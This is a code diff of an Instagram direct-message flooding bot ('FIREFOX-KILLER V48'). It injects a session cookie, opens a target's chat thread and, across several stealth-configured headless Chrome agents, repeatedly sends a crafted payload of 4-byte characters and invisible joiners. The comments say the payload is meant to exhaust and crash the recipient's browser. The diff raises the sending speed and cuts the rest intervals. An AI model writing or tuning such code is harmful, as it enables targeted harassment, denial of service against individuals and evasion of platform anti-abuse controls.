@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (BYPASS-V47)
-# 📅 STATUS: ZERO-LAG-SENDING | 4-AGENT TOTAL | AWS-CPU-STRIKE
+# 🚀 PROJECT: PRAVEER.OWNS (FIREFOX-KILLER V48)
+# 📅 STATUS: HEAP-SATURATION | 4-AGENT TOTAL | AWS-HARD-CRASH
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,29 +12,30 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.2, 0.4)    # 🛡️ Tuned for maximum server stability
-REST_AFTER_STRIKES = 100   
-REST_DURATION = 5          
+BURST_SPEED = (0.05, 0.1)   # 🔥 Maximum Velocity
+REST_AFTER_STRIKES = 150   
+REST_DURATION = 2          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_bypass_payload():
-    """Generates a visible, high-impact block that bypasses local rendering lag."""
+def get_firefox_killer_payload():
+    """Generates a high-byte surrogate payload to fragment the browser heap."""
     u_id = random.randint(100, 999)
-    # \u2060 = Word Joiner (Invisible glue)
-    # \u2068 = Directional Isolate (Forces CPU recalculation)
-    glue, iso, pop = "\u2060", "\u2068", "\u2069"
+    # 𒀱 = Cuneiform (4 bytes) | 🌙 = Moon (4 bytes) | 𝕻 = Fraktur (4 bytes)
+    # Mixing these prevents Firefox's 'String Deduplication'
+    heavy = ["𒀱", "🌙", "𝕻", "𝙰"]
+    glue = "\u2060" # Word Joiner (Invisible)
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [ATOMIC_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HEAP_LOCK:{u_id}]"
     
     body = []
-    # 350 lines - Optimized for high-speed transmission
-    for i in range(350):
-        # We sandwich the branding between invisible directional shifts
-        # This keeps the text visible but makes the 'Logic' of the line heavy
-        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {i}{pop}{glue*15}"
+    # 400 lines of unique, high-byte memory allocations
+    for i in range(400):
+        random.shuffle(heavy)
+        # We bond high-byte chars to ensure Firefox can't compress the string
+        line = f"PRAVEER PAPA ON TOP 🌙 {''.join(heavy * 6)} {i}{glue*8}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9995]
@@ -45,9 +46,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        # 🛡️ CRITICAL: Disable all visual rendering for YOUR bot to prevent lag
-        chrome_options.add_argument("--disable-gpu")
-        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
+        chrome_options.add_argument("--disable-gpu") # Keep YOUR bot light
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -56,25 +55,19 @@ def get_driver(agent_id):
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def bypass_send(driver, text):
-    """Bypasses the 'Typing' hang by force-triggering the socket event."""
+def atomic_send(driver, text):
+    """Bypasses UI lag by forcing a direct DOM 'Enter' event."""
     try:
-        # This script 'Nukes' the input box and fires the ENTER event immediately
-        # It uses the Native DOM 'Input' event to trick Instagram into thinking the user typed instantly.
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
-                // 1. Clear current state
-                document.execCommand('selectAll', false, null);
-                document.execCommand('delete', false, null);
-                // 2. Inject payload
                 document.execCommand('insertText', false, arguments[0]);
-                // 3. Trigger React/Angular internal state update
+                // Fire Native Input Event for Instagram State
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                // 4. Force Enter key event
+                // Fire Enter Key
                 var e = new KeyboardEvent('keydown', {
-                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true, cancelable: true
+                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true
                 });
                 box.dispatchEvent(e);
             }
@@ -89,28 +82,26 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(15) # Wait for DOM to stabilize
+            time.sleep(12) 
             
             strike_count = 0
             while True:
-                payload = get_bypass_payload()
-                if bypass_send(driver, payload):
+                payload = get_firefox_killer_payload()
+                if atomic_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Atomic Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Heap-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 50 == 0:
-                        # Reset memory before local lag kicks in
+                    if strike_count % 80 == 0:
                         driver.refresh()
-                        time.sleep(8)
-                
+                        time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(5)
+            time.sleep(2)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
